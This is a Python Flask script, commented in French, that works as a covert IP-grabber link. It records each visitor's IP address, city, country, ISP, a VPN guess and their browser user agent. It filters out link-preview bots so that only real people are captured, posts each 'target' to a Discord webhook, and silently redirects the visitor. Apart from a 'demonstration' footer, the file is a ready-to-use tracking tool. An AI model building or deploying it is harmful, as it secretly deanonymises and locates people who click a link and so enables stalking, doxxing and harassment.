from flask import Flask, request, redirect
import requests
from datetime import datetime

app = Flask(__name__)

# --- CONFIGURATION ---
WEBHOOK_URL = "WEBHOOK" # Remplace par ton vrai lien !
TARGET_URL = "TARGET"
EMBED_COLOR = 16711680 # Couleur rouge en format décimal

def get_ip_info(ip):
    """Interroge une API gratuite et renvoie un dictionnaire avec les infos"""
    info = {
        "country": "Inconnu",
        "city": "Inconnue",
        "isp": "Inconnu",
        "vpn_status": "⚠️ Analyse impossible"
    }
    
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp")
        data = response.json()
        
        if data.get("status") == "success":
            info["country"] = data.get("country", "Inconnu")
            info["city"] = data.get("city", "Inconnue")
            info["isp"] = data.get("isp", "Inconnu")
            
            # Détection basique VPN/Serveur
            vpn_keywords = ['vpn', 'hosting', 'datacenter', 'cloud', 'm247', 'ovh', 'digitalocean', 'amazon', 'google', 'hetzner']
            is_vpn = any(keyword in info["isp"].lower() for keyword in vpn_keywords)
            
            info["vpn_status"] = "🔴 Probable VPN / Proxy / Serveur" if is_vpn else "🟢 Connexion Résidentielle / Mobile"
            
    except Exception:
        pass
        
    return info

@app.route("/")
def index():
    # 1. Récupération de l'IP (gère Cloudflare et requêtes directes)
    ip = request.headers.get('CF-Connecting-IP')
    if not ip:
        if request.headers.getlist("X-Forwarded-For"):
            ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
        else:
            ip = request.remote_addr

    user_agent = request.headers.get('User-Agent', '')

    # 2. Filtre anti-bots
    bot_keywords = ['bot', 'crawler', 'spider', 'discord', 'twitter', 'facebook', 'preview', 'google', 'slurp', 'uptime', 'yandex', 'bing']
    if any(keyword in user_agent.lower() for keyword in bot_keywords):
        return redirect(TARGET_URL)

    # 3. Récupération des données pour l'humain détecté
    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip_data = get_ip_info(ip)

    # 4. Enregistrement local (Texte classique pour les logs)
    log_text = f"[{date}] IP: {ip} | {ip_data['city']}, {ip_data['country']} | ISP: {ip_data['isp']} | UA: {user_agent}\n"
    with open("logs.txt", "a", encoding="utf-8") as f:
        f.write(log_text)

    # 5. Création de l'Embed Discord
    discord_payload = {
        "embeds": [
            {
                "title": "🎯 Nouvelle Cible Interceptée",
                "color": EMBED_COLOR,
                "fields": [
                    {
                        "name": "🌐 Adresse IP",
                        "value": f"`{ip}`",
                        "inline": True
                    },
                    {
                        "name": "📍 Localisation",
                        "value": f"{ip_data['city']}, {ip_data['country']}",
                        "inline": True
                    },
                    {
                        "name": "🏢 Opérateur (ISP)",
                        "value": f"{ip_data['isp']}",
                        "inline": True
                    },
                    {
                        "name": "🛡️ Type de connexion",
                        "value": f"{ip_data['vpn_status']}",
                        "inline": False
                    },
                    {
                        "name": "📱 Navigateur / Appareil (User-Agent)",
                        "value": f"```{user_agent}```",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": f"Démonstration Cyber • {date}"
                }
            }
        ]
    }

    # Envoi au Webhook Discord
    try:
        requests.post(WEBHOOK_URL, json=discord_payload)
    except:
        pass

    # 6. Redirection invisible vers le lien target
    return redirect(TARGET_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)